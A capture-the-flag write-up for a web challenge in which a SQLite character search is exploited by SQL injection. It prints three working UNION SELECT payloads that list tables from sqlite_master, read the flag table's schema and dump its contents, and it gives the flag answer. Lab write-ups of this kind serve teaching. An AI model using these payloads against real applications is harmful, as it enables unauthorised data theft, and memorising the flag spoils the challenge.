# SQLI
> Write-up author: vreshco
## DESCRIPTION:
Apakah kamu tahu apa itu SQL Injection?

http://ctf.tcp1p.com:25859/

## HINT:
1. google how to get table names in sqlite.
2. `nijika' UNION SELECT"1","2",3;--` , mungkin dia tidak menerima integer, hmmm... maybe...

## STEPS:
1. Given a web app.

> WEB APP![image](https://user-images.githubusercontent.com/70703371/229270940-bf2de7fd-f502-470f-857b-f5da7e71e94b.png)


2. Clicking the `playground` option shall allows us to search for characters.

![image](https://user-images.githubusercontent.com/70703371/229271011-e6cac1b3-7591-4ab7-89f7-122a4e71f1de.png)


3. Based from the hint given, the db used is **sqlite** and let's used the sqlite query given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/229271093-31e778a0-0189-47da-b115-570ce1c67eef.png)


4. I did a small outsource about **sqlite exploit** [query](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)]
5. And found a documentation about it, it seems we can use "tbl_name" to exract all the tables avail.

> THE QUERY

```sql
nijika' UNION SELECT"1","tbl_name","3" FROM sqlite_master;--
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/229271320-2263d533-b03c-4d62-9440-1ac6369dfa7a.png)


6. Notice, there's a **flag** table.
7. Let's extract all the columns avail.

> QUERY

```sql
nijika' UNION SELECT"1","sql","3" FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='flag';--
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/229271765-6cb02c92-2960-4dae-aca6-f2887e876aef.png)


8. Finally, let's extract the data from the column.

> QUERY

```sql
nijika' UNION SELECT"1","this_is_the_flag","3" FROM flag;--
```


> RESULT

![image](https://user-images.githubusercontent.com/70703371/229271945-6f2189a0-fbf4-4fa1-aa98-8579f2e7d5e3.png)


9. Got the flag!

## FLAG

```
TCP1P{Sequel_Query_Langueange_Injection_1337}
```


